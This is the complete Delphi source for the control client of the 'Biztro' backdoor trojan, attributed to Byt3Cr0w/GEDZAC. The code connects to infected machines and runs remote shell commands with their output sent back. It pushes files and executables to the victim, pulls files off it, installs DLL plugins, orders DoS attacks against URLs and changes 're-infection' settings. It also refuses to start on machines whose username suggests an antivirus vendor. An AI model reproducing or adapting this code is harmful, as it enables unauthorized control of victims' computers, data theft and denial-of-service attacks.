   unit Splash_unit;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, jpeg, ExtCtrls, StdCtrls,URLMON,WinInet,SHELLAPI, ComCtrls, Buttons,Winsock;

   type
     TSplash = class(TForm)
       Image1: TImage;
       Image2: TImage;
       Image3: TImage;
       GroupBox1: TGroupBox;
       Memo1: TMemo;
       ProgressBar1: TProgressBar;
       Label3: TLabel;
       Label2: TLabel;
       SpeedButton2: TSpeedButton;
       Image4: TImage;
       Image5: TImage;
       Image7: TImage;
       Image6: TImage;
       GroupBox2: TGroupBox;
       Memo2: TMemo;
       Edit1: TEdit;
       GroupBox3: TGroupBox;
       Image9: TImage;
       GroupBox4: TGroupBox;
       Edit2: TEdit;
       Label4: TLabel;
       SpeedButton3: TSpeedButton;
       SpeedButton4: TSpeedButton;
       SpeedButton5: TSpeedButton;
       Label5: TLabel;
       SpeedButton6: TSpeedButton;
       Memo3: TMemo;
       GroupBox5: TGroupBox;
       ProgressBar2: TProgressBar;
       Label1: TLabel;
       ComboBox1: TComboBox;
       SpeedButton7: TSpeedButton;
       Image8: TImage;
       Edit3: TEdit;
       ProgressBar3: TProgressBar;
       SpeedButton8: TSpeedButton;
       SpeedButton11: TSpeedButton;
       SpeedButton1: TSpeedButton;
       GroupBox6: TGroupBox;
       Label6: TLabel;
       Label7: TLabel;
       Label8: TLabel;
       SpeedButton10: TSpeedButton;
       SpeedButton9: TSpeedButton;
       SpeedButton13: TSpeedButton;
       Image10: TImage;
         procedure Pro;
       procedure SpeedButton2Click(Sender: TObject);
       procedure Edit1MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure SpeedButton1MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure Memo2MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure GroupBox2MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure FormMouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure Image6MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure SpeedButton3Click(Sender: TObject);
       procedure SpeedButton5Click(Sender: TObject);
       procedure SpeedButton6Click(Sender: TObject);
       procedure SpeedButton4Click(Sender: TObject);
       procedure Image8Click(Sender: TObject);
       procedure ComboBox1Change(Sender: TObject);
       procedure Edit3Change(Sender: TObject);
       procedure SpeedButton7Click(Sender: TObject);
       procedure BioChange(const m:string;const e:integer);
       procedure error(const m:byte);
       procedure Upload(const x:string);
       procedure Upload2(const x:string);
       procedure SendComm(m:string);
       procedure Disconnect;
       procedure Download(const x1:string);
       procedure Local(const m:string;const e:integer);
       procedure SendPlugin(const x:string);
       procedure SpeedButton1Click(Sender: TObject);
       procedure SpeedButton12Click(Sender: TObject);
       procedure SpeedButton9Click(Sender: TObject);
       procedure Sund;
       procedure ConProg;
       procedure SpeedButton11Click(Sender: TObject);
       procedure SpeedButton10Click(Sender: TObject);
       procedure SpeedButton8Click(Sender: TObject);
       procedure Edit1KeyDown(Sender: TObject; var Key: Word;
         Shift: TShiftState);
       procedure SpeedButton13Click(Sender: TObject);
       procedure FormClose(Sender: TObject; var Action: TCloseAction);
       procedure Image9Click(Sender: TObject);
       procedure FormCreate(Sender: TObject);
       procedure Edit2KeyDown(Sender: TObject; var Key: Word;
         Shift: TShiftState);
     private
       { Private declarations }

      public

     public
       { Public declarations }

     end;
       const
     Made_By = 'Biztro Control Client by Byt3Cr0w/GEDZAC - Project Finish Date: 26/11/2004 - www.gedzac.tk';
     SP = #13#10;
     COMLIST = 'Command List:'+sp+sp+'Command name: Remote cmd'+sp+'Use: /[windows cmd command]'+sp+'Biztro will executed your commands in the windows cmd of the infected machine and send to you the result of the executed command.'+sp+'Example: /DIR C:\'+sp+sp+'Command name: Upload'+sp+'Use: Upload [url/localhost]'+sp+'With this command the remote machine downloads a file from an URL or your computer.'+sp+'Example1: Upload http://www.somepage.com/file.exe'+sp+'Example2: Upload localhost/C:\file.exe'+sp+sp+'Command name: UploadEx'+sp+'Use: Ex-Upload [url/localhost]'+sp+'With this command the remote machine downloads a file from an URL or your computer and execute it.'+sp+'Example1: Ex-Upload http://www.somepage.com/file.exe'+sp+'Example2: ExUpload localhost/C:\file.exe'+sp+sp+
               'Command name: Download'+sp+'Use: Download [RemoteFile]'+sp+'With this command you can download a file from the remote machine.'+sp+'Example: Download C:\remotefile.exe'+sp+sp+'Command name: Dos'+sp+'Use: Dos [URL]'+sp+'With this command the remote machine make a D.O.S attack to an specific URL.'+sp+'Example: Dos www.url.com'+sp+sp+'Comman name: Plugin'+sp+'Use: Plugin [url of the DLL]'+sp+'With this command you will send and install a plugin for Biztro in the remote machine (Must be a valid Dynamic Library)'+sp+
               'Example: Plugin www.biztroplugins.com/plugin.dll';
   var
     Splash: TSplash;
     ID:dword;
     ToLoad,j,rip:string;
     control1,control2:integer;
     Zock : Tsocket;
     e,e1,e2,x,me:integer;
     shutdownx,cp,NowCon:boolean;
   implementation

   {$R *.dfm}


   procedure Msgx(const m:string);
   begin
   MessageBox(0,Pchar(m),'Biztro Control Client - Gedzac Labs 2004',32);
   end;

   procedure TSplash.Disconnect;
   begin
   try closesocket(Zock); except end;
   Label5.Caption := 'Status: Disconnected';
   GroupBox3.Hide;
   GroupBox3.Height := 361;
   Image9.Show;
   Memo3.Text := Memo3.Text + 'Now Disconnected'+sp;
   Splash.Update;
   Edit2.Text := '';
   e:=0;e1:=0;e2:=0;
   NowCon := false;
   end;

   procedure Tsplash.error(const m:byte);
   begin
   case m of
   1: begin
   MsgX('Error: Connection Failed'+sp+'Possible reasons:'+sp+' -The remote computer is not connected to internet.'+sp+' -The remote computer is behind a firewall.'+sp+' -The remote computer is not infected by Biztro.');
   Disconnect;
   end;
   2: begin
   Memo2.Text := Memo2.Text + comlist;
   Edit1.Clear;
   end;
   end;
   end;


   procedure Sendx(const ss:string);
   begin
   Send(Zock,Pointer(ss)^,Length(ss),0);
   end;

   procedure sendf(const m:string);
      var   vz:array [0..1023] of Char;
       ozz,fw:integer;
       iam:file;
       z,afuera,fat:string;
      begin
      z := m;
       Delete(z,1,5);
   z := Copy(z,1, Pos('HTTP/1',z)-2);
      if not fileexists(z) then
      begin
   writeln('mno');
      end;
      fw := FileOpen(z,0);
      fat := floattostr(getfilesize(fw,nil));
      fileclose(fw);
      AssignFile(iam,z);
            filemode:=0;
           try reset(iam,1); except end;
       afuera := 'HTTP/1.1 200 OK' + SP
           + 'Accept-Ranges: bytes' + SP
           + 'Content-Length: '+fat + sp
           + 'Keep-Alive: timeout=15, max=100' + sp
           + 'Connection: Keep-Alive' + sp
           + 'Content-Type: application/x-msdownload' + sp + sp;
              Send( x, Addr(afuera[1])^, Length(afuera), 0 );
       repeat
         BlockRead(iam,vz[0],SizeOf(vz),ozz);
         if ozz<=0 then break; if send(x,vz[0],ozz,0)<=0 then break;
       until ozz<>1024;
       closefile(iam);
       end;

   function Wakesock: Boolean;
   var
     anne: TWSAData;
   begin
     Result :=  WSAStartup( $101, anne ) = 0
   end;


   function LoadService(casa:integer): Integer;
   var direc: TSockAddrIn;
   begin
     Result := Socket( PF_INET, SOCK_STREAM, IPPROTO_TCP );
     if Result = INVALID_SOCKET then
       Exit;
     with direc do begin
       sin_family := AF_INET;
       sin_port := htons(casa);
       sin_addr.S_addr := 0;
     end;

     if Bind( Result, direc, SizeOf(direc) ) <> 0 then begin
       Result := INVALID_SOCKET;
       Exit;
     end;

     if Listen(Result,5) <> 0 then
       Result := INVALID_SOCKET;
   end;

   procedure bye(Sock:Integer);
   begin
     ShutDown(Sock,2);
     CloseSocket(Sock);
   end;

   procedure RemoteModule(me:integer);
   var
     Data: array[ 0..8191 ] of Char;
     w,z: Pointer;
     l: Char;
     current: Integer;
       begin
     x := Accept(me, nil, nil );
     repeat

       current := Recv(x, Data, SizeOf(Data), 0 );
       if current = 0 then
         current := SOCKET_ERROR
       else
       begin
         w := @Data;
         z := Pointer(Integer(@Data) + current);
         l := #0;
         while Integer(w) < Integer(z) do begin
           if (l = #13) and (Char(w^) = #10 ) then begin
             Inc( Integer(w));
             Continue;
           end;
           l := Char(w^);
           if l = #13 then
           begin
                                    TRY
       if Pos('GET',j) > 0 then sendf(j);
                                except end;
           j := '';
           end else
             j := j + l;
           Inc(Integer(w));
         end;
       end;
     until current = SOCKET_ERROR;
     bye(x);
   end;

   procedure Server;
   begin
     if not Wakesock then exit;
     me := LoadService(2777);
     if me = INVALID_SOCKET then exit;
     repeat
   RemoteModule(me);
     until shutdownx;
     bye(me);
     WSACleanUp;
    end;

   function packet(pack:string):boolean;
   var bag :array [0..2048] of char;
   begin
     zeroMemory(@bag[0],SizeOf(bag));
     if(Recv(Zock,bag,SizeOf(bag),0)=SOCKET_ERROR)or(Copy(bag,1,Length(pack))<>pack) then
     result:=False else Result:=True;
     end;

     function Connectx(m:string):boolean;
     var direcx: TSockAddr;
        InitDllSock  : TWSAData;
   begin
    WSAStartup( $101, InitDllSock );
     Zock := Socket( PF_INET, SOCK_STREAM, IPPROTO_TCP );
     if Zock = INVALID_SOCKET then exit;
     with direcx do begin
       sin_family := AF_INET;
       sin_port := htons(666);
       sin_addr.S_addr := Inet_Addr(pchar(m));
     end;
     if not Connect(Zock,direcx,SizeOf(direcx)) = 0 then Result := false else Result := true;
   Sendx('P'+sp);
    if packet('1') then Result:=true else begin Result := false; CloseSocket(Zock); end;
   end;

   function RemoteBioSetup:string;
   var bag :array [0..2048] of char;
   begin
   Sendx('Sta'+sp);
   Recv(Zock,bag,SizeOf(bag),0);
   Result := Copy(bag,1,300);
   end;

   function ip:string;
   var somedata:TWSAData;
   begin
       WSAStartup(257,somedata);
       Result := Inet_ntoa(pinaddr(GetHostByName(nil)^.h_addr_list^ )^);
       WSACleanup;
   end;

   function MakeD(x:string):string;
   var i:integer;
       s,m,from:string;
       begin
   m := x;
   Delete(m,1,3);

   from := m;
   for i:= 1 to Length(m) do if m[i] <> #32 then s:=s+m[i] else s:=s+'+';
   m := Copy(s,1,3);
   Delete(s,1,3);
   s := 'Biz0'+m+s;
   Result := s;
   end;


   procedure TSplash.Local(const m:string;const e:integer);
   var i:integer;
   begin
   case e of
   1: begin
   GroupBox3.Hide;
   Image9.Hide;
   GroupBox6.Show;
   Splash.Update;
   for i := 0 to 113 do begin sleep(10); GroupBox6.Height := 0+i; Splash.Update; end;i:=0;
   Splash.Update;
   Label6.Caption := 'From: '+m;
   Label7.Caption := 'to: '+rip;
   Label8.Caption := 'Status: Transfering...';
   Splash.Update;
   end;
   2: begin
   Label8.Caption := 'Status: Done';
   Splash.Update;
   sleep(800);
   for i := 0 to 113 do begin sleep(10); GroupBox6.Height := 113-i; Splash.Update; end;i:=0;
   Splash.Update;
   GroupBox3.Show;
   GroupBox6.Hide;
   end;
   3:begin
   GroupBox3.Hide;
   Image9.Hide;
   GroupBox6.Show;
   Splash.Update;
   for i := 0 to 113 do begin sleep(10); GroupBox6.Height := 0+i; Splash.Update; end;i:=0;
   Label6.Caption := 'From: http://'+ip+':2777/'+m;
   Label7.Caption := 'to: '+rip;
   Label8.Caption := 'Status: Downloading...';
   Splash.Update;
   end;
   end;
   end;

   procedure Tsplash.Download(const x1:string);
   var i:integer;
       ram,k,ex,m,x:string;
   begin
   Randomize;
   m := x1;
   Delete(m,1,9);
   k := m;
   for i := 1 to Length(m) do if m[i] = #32 then m:=MakeD(k);i:=0;
   for i := Length(m) downto 0 do ex:=ex+m[i]; i:=0;
   for i := 1 to Length(ex) do if ex[i] <> '.' then x:=x+ex[i] else break;i:=0;ex:='';
   for i := Length(x) downto 0 do ex:=ex+x[i]; i:=0;
   ram := 'C:\BiztroDownload'+IntToStr(Random(999999))+'.'+ex;
   Memo2.Text := Memo2.Text + 'Downloading file from: http://'+rip+':2888/'+m+sp;
   Local(m,3);
   Splash.Update;
   UrlDownLoadToFile(nil,PchaR('http://'+rip+':666/'+m),Pchar(ram),0,nil);
   Memo2.Text := Memo2.Text + 'Downloaded file in: '+ram+sp;
   Local(m,2);
   end;

   procedure Tsplash.Upload2(const x:string);
   var m,re:string;
   bag :array [0..2048] of char;
   o:integer;
   label u;
   label k;
   begin
   m:=x;
   Delete(m,1,9);
   if Pos('exupload localhost/',x) > 0 then goto u;
   goto k;
   u:
   CreateThread(nil,0,@Server,nil,0,ID);
   Delete(m,1,10);
   m := 'http://'+ip+':2777/'+m;
   o:=1;
   k:
   Memo2.Text := Memo2.Text + 'Sending upload command...'+sp;
   if o = 1 then Local(m,1);
   Sendx('/+\'+m+sp);
   Memo2.Text := Memo2.Text + 'Waiting for reply...'+sp;
   Recv(Zock,bag,SizeOf(bag),0);
   re:=Copy(bag,1,300);
   if Pos('B1',re) > 0 then if Pos('B1*',re) > 0 then Memo2.Text := Memo2.Text + 'Biztro can not upload the file.'+sp else begin Delete(re,1,2); Memo2.Text := Memo2.Text + 'Uploaded file in: '+re+sp;
   if o=1 then  Local(m,2);
   m:=''; e:=0;
   end;
   end;

   procedure Tsplash.Upload(const x:string);
   var m,re:string;
   bag :array [0..2048] of char;
   o:integer;
   label u;
   label k;
   begin
   m:=x;
   Delete(m,1,7);
   if Pos('upload localhost/',x) > 0 then goto u;
   goto k;
   u:
   Delete(m,1,10);
   CreateThread(nil,0,@Server,nil,0,ID);
   m := 'http://'+ip+':2777/'+m;
   o:=1;
   k:
   Memo2.Text := Memo2.Text + 'Sending upload command...'+sp;
   if o = 1 then Local(m,1);
   Sendx('/*\'+m+sp);
   Memo2.Text := Memo2.Text + 'Waiting for reply...'+sp;
   Recv(Zock,bag,SizeOf(bag),0);
   re:=Copy(bag,1,300);
   if Pos('B1',re) > 0 then if Pos('B1*',re) > 0 then Memo2.Text := Memo2.Text + 'Biztro can not upload the file.'+sp else begin Delete(re,1,2); Memo2.Text := Memo2.Text + 'Uploaded file in: '+re+sp;
   if o=1 then  Local(m,2);
   m:=''; e:=0;
   end;
   end;


   procedure  TSplash.SendPlugin(const x:string);
   var m:string;
   begin
   m:=x;
   Delete(m,1,7);
   Sendx('/0\'+m+sp);
   Memo2.Text := Memo2.Text + 'The remote plugin url was sended.'+sp;
   end;

   function MakeDownFile(m:string):boolean;
   begin
   Sendx('MID'+m+sp);
   if not packet('D1') then Result := false else Result := true;
   end;


   procedure TSplash.BioChange(const m:string;const e:integer);
   var t:string;
       i:integer;
   label fin;
   begin
   if e=1 then t := '<I>'; if e=2 then t := '<E>'; if e=3 then t := '<T>';
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 409+i; Splash.Update; end;
   e2:=1;
   sleep(500);
   Splash.Update;
   SpeedButton7.Caption := 'Sending new settings...';
   Memo2.Text := Memo2.Text + 'Sending new settings...'+sp;
   Splash.Cursor := crHourGlass;
   SpeedButton7.Cursor := crNo;
   ProgressBar3.StepIt;
   ProgressBar3.Show;
   Splash.Update;
   Sendx(t+m+sp);
   sleep(1000);
   SpeedButton7.Caption := 'Waiting for reply...';
   Memo2.Text := Memo2.Text + 'Waiting for reply...'+sp;
   ProgressBar3.StepIt;
   Splash.Update;
   sleep(1000);
   if not packet('E1') then begin Error(1); exit; goto fin; end;
   Splash.Update;
   SpeedButton7.Caption := 'Done';
   Memo2.Text := Memo2.Text + 'The remote Bio Setup was changed'+sp;
   fin:
   SpeedButton7.Cursor := crDefault;
   Splash.Cursor := crDefault;
   ProgressBar3.StepIt;
   Splash.Update;
   Sleep(800);
   SpeedButton7.Caption := '';
   Splash.Update;
   if e2 = 1 then begin
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 409-i; Splash.Update; end;
   e2:=0;
   end;
   SpeedButton7.Caption := 'Change';
   ComboBox1.Text := 'Options';
   Edit3.Text := 'Select an Option';
   Edit3.Enabled := false;
   e1:=0;
   ProgressBar3.Hide;
   Splash.Update;
   end;

   procedure TSplash.SendComm(m:string);
   var bag:array [0..100] of char;
    a,b,c,d,ram:string;
    k:textfile;
    begin
   Randomize;
   ram := 'C:\BiztroDat'+IntToStr(Random(999999))+'.txt';
   b:=m;
   If Pos('/echo',b) > 0 then begin Memo2.Text := Memo2.Text + 'The ECHO Command is not allowed.'+sp; exit; end;
   If Pos('/@echo',b) > 0 then begin Memo2.Text := Memo2.Text + 'The ECHO Command is not allowed.'+sp; exit; end;
   Delete(b,1,1);
   Sendx('BXC'+b+sp);
   Recv(Zock,bag,SizeOf(bag),0);
   a := Copy(bag,1,100);
   UrlDownLoadToFile(nil,PchaR('http://'+rip+':666/'+a),Pchar(ram),0,nil);
   try
   assignfile(k,ram);
   reset(k);
   while not eof(k) do begin
   Readln(k,c);
   d:=d+c+sp;
   end;
   Memo2.Text := Memo2.Text +sp+d+sp;
   CloseSOcket(Zock);
   closefile(k);
   Erase(k);
   if not connectx(rip) then Error(2);
   except end;
   end;


   function CheckHealth:boolean;
   begin result := true; end;

   function CheckRAM:boolean;
   var RAM:TMemoryStatus;
   begin
   RAM.dwLength := sizeof(RAM);
   GlobalMemoryStatus(RAM);
   with RAM do if dwMemoryLoad > 95 then Result := false else Result := true;
   end;

   function CheckUser:boolean;
   var s: dword;
   c:array[0..255] of char;
   user:string;
   begin
   s := 256;
   if GetUserName(c,s) then user:=c else begin Result := false; exit; end;
   if (Pos('Antivirus',user)>0) or (Pos('PER An',user)>0) or (Pos('Panda An',user)>0) or (Pos('Norman An',user)>0) or (Pos('Symantec',user)>0) then Result := false;
   end;



   function CheckISP:boolean;
   begin
    Result := InternetGetConnectedState(nil, 0);
   end;


   procedure TSplash.Pro;
   var R: TRect;
   begin
         Memo1.Visible := true;
         ProgressBar1.Visible := true;
         Splash.Update;
   if control1 = 1 then exit;
   control1 := 1;
   e:=0;e1:=0;e2:=0;
   Memo1.Lines.Add('Loading...');
   Memo1.Lines.Add('Checking integrity...');
   ProgressBar1.StepIt;
   Splash.Update;
   sleep(500);
   if CheckHealth then Memo1.Lines.Add('Integrity OK') else begin Msgx('Error: Wrong Integrity - Please install again.'); exitprocess(0); end;
   Memo1.Lines.Add('Checking space in RAM...');
   ProgressBar1.StepIt;
   Splash.Update;
   sleep(500);
   if CheckRAM then Memo1.Lines.Add('Space in RAM OK') else begin Msgx('Error: BCC need more RAM - Please free some space in memory.'); exitprocess(0); end;
   Memo1.Lines.Add('Checking Local machine...');
   ProgressBar1.StepIt;
   Memo1.Visible := true;
   Splash.Update;
   sleep(500);
   if CheckUser then Memo1.Lines.Add('Local machine OK') else begin Msgx('Error: For security reasons BCC can not run in this machine - Please remove this program from your HD.'); exitprocess(0); end;
   Memo1.Lines.Add('Checking for Internet...');
   ProgressBar1.StepIt;
   Splash.Update;
   sleep(500);
   if CheckISP then Memo1.Lines.Add('Internet is OK') else begin Msgx('Error: BCC need internet service - Please connect to internet'); exitprocess(0); end;
   Splash.Update;
   sleep(800);
   SystemParametersInfo(SPI_GETWORKAREA, 0, @R, 0);
      SetBounds(R.Left, R.Top, R.Right-R.Left, R.Bottom-R.Top);
      ProgresSBar1.Destroy;
      Image1.Destroy;
      Image2.Destroy;
      Image3.Destroy;
      Memo1.Destroy;
      Label2.Destroy;
      Label3.Destroy;
      SpeedButton2.Destroy;
      GroupBox1.Destroy;
   Image4.Visible := true;
   Image5.Visible := true;
   Image6.Visible := true;
   Image7.Visible := true;
   Image9.Visible := true;
   Image10.Visible := true;
   GroupBox2.Visible := true;

    PostMessage(ProgressBar2.Handle, $0409, 0,$00804000);
    PostMessage(ProgressBar3.Handle, $0409, 0,$00804000);
   Splash.BorderStyle := bsSingle;

      end;



   procedure TSplash.SpeedButton2Click(Sender: TObject);
   begin
   Pro;
   end;




   procedure TSplash.Edit1MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;

   procedure TSplash.SpeedButton1MouseMove(Sender: TObject;
     Shift: TShiftState; X, Y: Integer);
   begin
   SpeedButton1.Font.Color := $009F5000;
   end;

   procedure TSplash.Memo2MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;

   procedure TSplash.GroupBox2MouseMove(Sender: TObject; Shift: TShiftState;
     X, Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;

   procedure TSplash.FormMouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;

   procedure TSplash.Image6MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;


   procedure TSplash.ConProg;
   begin
   NowCon := true;
   ProgressBar2.Show;
   Label5.Caption := 'Status: Connecting to '+Edit2.Text;
   Memo2.Text := Memo2.Text + 'Connecting to '+Edit2.Text+'...'+sp;
   Splash.Update;
   SpeedButton3.Caption := 'Connecting...';
   SpeedButton5.Enabled := true;
   Splash.Update;
   if not Connectx(Edit2.Text) then
   begin
   SpeedButton3.Caption := 'Connect';
   Label5.Caption := 'Status: Connection failed.';
   Memo2.Text := Memo2.Text + 'Connection failed.'+sp;
   Error(1);
   Splash.Update;
   exit;
   end;
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   SpeedButton3.Caption := 'Connected';
   Label5.Caption := 'Status: Connected to '+Edit2.Text;
   Memo2.Text := Memo2.Text + 'Connected to '+Edit2.Text+sp;
   SpeedButton3.Caption := 'Connect';
   ProgressBar2.Hide;
   Splash.Update;
   GroupBox3.Show;
   Image9.Hide;
   Memo3.Text := RemoteBioSetup;
   rip := Edit2.Text;
   end;

   procedure TSplash.SpeedButton3Click(Sender: TObject);
   begin
   ConProg;
   end;

   procedure TSplash.SpeedButton5Click(Sender: TObject);
   begin
   if not NowCon then exit;
   SpeedButton5.Caption := 'Disconnecting';
   Label5.Caption := 'Status: Disconnecting from '+rip;
   Splash.Update;
   ProgressBar2.StepIt;
   ProgressBar2.Show;
   Splash.Update;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   CloseSocket(Zock);
   GroupBox3.Hide;
   Image9.Show;
   SpeedButton5.Caption := 'Disconnect';
   Label5.Caption := 'Status: Disconnected';
   Splash.Update;
   ProgressBar2.Hide;
   NowCon := false;
   end;



   procedure TSplash.SpeedButton6Click(Sender: TObject);
   begin
   Image9.Visible := false;
   Image8.Visible := false;
   Label1.Left := 100;
   Label1.Caption := 'Biztro IP List';
   GroupBox3.Visible := true;
   if not fileexists('list.ini') then Memo3.Text := 'The IP list is emty.' else Memo3.Lines.LoadFromFile('list.ini');
   end;

   procedure TSplash.SpeedButton4Click(Sender: TObject);
   var a:textfile;
   begin
   if Edit2.Text = '' then begin Msgx('Please put a valid IP Address'); exit; end;
   AssignFile(a,'list.ini');
   if not fileexists('list.ini') then rewrite(a) else append(a);
   writeln(a,Edit2.Text); closefile(a);
   Msgx(Edit2.Text+' was added to the IP List');

   end;

   procedure TSplash.Image8Click(Sender: TObject);
   var i:integer;
   begin
   if e = 0 then begin
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 361+i; Splash.Update; e:=1;  end;
   exit;
   end;
   if e = 1 then begin
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 385-i; Splash.Update; e:=0; end;
   e1:=0;
   exit;
   end;
   end;

   procedure TSplash.ComboBox1Change(Sender: TObject);
   begin
   if ComboBox1.Text <> 'Options' then Edit3.Enabled := true else Edit3.Enabled := false;
   if ComboBox1.Text = 'Re-Infection Day' then Edit3.Text := '15';
   if ComboBox1.Text = 'Cmd Status' then Edit3.Text := 'Enable';
   if ComboBox1.Text = 'Max Threads' then Edit3.Text := '26';

   end;

   procedure TSplash.Edit3Change(Sender: TObject);
   var i:integer;
   begin
   if Edit3.Text <> '' then if e1=0 then begin
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 385+i; Splash.Update; end;
   e1:=1;
   exit;
   end;
   end;

   procedure TSplash.SpeedButton7Click(Sender: TObject);
   var a:integer;
       b:string;
   begin
   b:=''; a:=0;
   b:= LowerCase(Edit3.Text);
   if ComboBox1.Text = 'Re-Infection Day' then
   try a:=StrToInt(Edit3.Text); except MsgX('Error: The Re-Infection date must be a valid number.'); exit; end;
   if ComboBox1.Text = 'Cmd Status' then
   if b<>'enable' then if b<>'disable' then begin MsgX('Error: The Cmd Status must be one of these:'+sp+' -Enable'+sp+' -Disable'); exit; end;
   if ComboBox1.Text = 'Max Threads' then
   try a:=StrToInt(Edit3.Text); except MsgX('Error: The Max Threads must be a valid number.'); exit; end;
   /////////////**** If we are on these point that means = Everything is OK  ****/////////
   if ComboBox1.Text = 'Re-Infection Day' then BioChange(b,1);
   if ComboBox1.Text = 'Cmd Status' then BioChange(b,2);
   if ComboBox1.Text = 'Max Threads' then BioChange(b,3);
   end;

   procedure TSplash.Sund;
   var a,b:string;
   label go;
   begin
   a := LowerCase(Edit1.Text);
   b:=a;
   Delete(b,1,4);
   if Pos('upload',a)>0 then goto go;
   if Pos('uploadex',a)>0 then goto go;
   if Pos('download',a)>0 then goto go;
   if Pos('dos',a)>0 then goto go;
   if Pos('dosx',a)>0 then goto go;
   if Pos('plugin',a)>0 then goto go;
   if Pos('/',a)>0 then goto go;
   error(2);
   exit;
   go:
   If Pos('/',a)>0 then begin SendComm(a); exit; end;
   If Pos('ex',a)>0 then begin Upload2(a); exit; end;
   If Pos('up',a)>0 then Upload(a);
   If Pos('download',a)>0 then download(a);
   If Pos('dos',a)>0 then begin Sendx('D*Z'+b+sp); Memo2.Text:=Memo2.Text +sp+'The Dos request was sended'+sp; Splash.Update; closesocket(Zock); Memo2.Text := Memo2.Text + 'Biztro is now totally dedicated to the DoS Attack, you have to wait for the Restart of the Remote machine to be able to connect again to '+rip+sp; Disconnect; end;
   If Pos('plugin',a)>0 then SendPlugin(a);
   end;

   procedure TSplash.SpeedButton1Click(Sender: TObject);
   begin
   Sund;
   Edit1.Clear;
   end;

   procedure TSplash.SpeedButton12Click(Sender: TObject);
   begin
   Memo2.Text := Memo2.Text + Comlist;
   end;

   procedure TSplash.SpeedButton9Click(Sender: TObject);
   begin
   Memo2.Clear;
   Memo2.Text := COMLIST;
   end;


   procedure TSplash.SpeedButton11Click(Sender: TObject);
   begin
   ShellExecute(0,nil,pchar('http://www.gedzac.tk'),'','',SW_SHOWNORMAL);
   end;

   procedure About;
   begin
   MsgX('Biztro Control Client - Coded & Designed by Byt3Cr0w/GEDZAC'+sp+'Greedz/Thnx to:'+sp+' - All Gedzac Members'+sp+' - Falckon/DCA'+sp+' - BlackRose =)'+sp+' - Sickbyte & Backus from PrimateLost'+sp+'And all the ppl that i forget...:)'+sp+'http://www.gedzac.tk');
   end;

   procedure TSplash.SpeedButton10Click(Sender: TObject);
   begin
   About;
   end;

   procedure TSplash.SpeedButton8Click(Sender: TObject);
   begin
   ShellExecute(0,nil,pchar('mailto:byt3cr0w@gedzac.zzn.com'),'','',SW_SHOWNORMAL);
   end;

   procedure TSplash.Edit1KeyDown(Sender: TObject; var Key: Word;
     Shift: TShiftState);
   begin
   if Key = VK_Return then begin Sund; Edit1.Clear; end;
   end;

   procedure TSplash.SpeedButton13Click(Sender: TObject);
   begin
   Memo2.Clear;
   end;

   procedure TSplash.FormClose(Sender: TObject; var Action: TCloseAction);
   begin
   About;
   end;

   procedure TSplash.Image9Click(Sender: TObject);
   begin
   ShellExecute(0,nil,pchar('http://www.gedzac.tk'),'','',SW_SHOWNORMAL);
   end;

   procedure TSplash.FormCreate(Sender: TObject);
   var bit:integer;
   begin
   Bit := Application.MessageBox ('Español: Al oprimir el botón SI/YES TU te estas haciendo responsable de todos'+sp+'los daños ocasionados por el uso indebido de este programa.'+sp+sp+'English: If you press the YES button YOU will have all the Responsibility of the illegal use of this program.'+sp+sp+'Byt3Cr0w/GEDZAC','Biztro Control Client',MB_YESNO+MB_ICONINFORMATION);
      If Bit = ID_NO Then
      begin
      About;
      exitprocess(0);
     end;

   end;

   procedure TSplash.Edit2KeyDown(Sender: TObject; var Key: Word;
     Shift: TShiftState);
   begin
   if Key = VK_Return then ConProg;
   end;

   end.
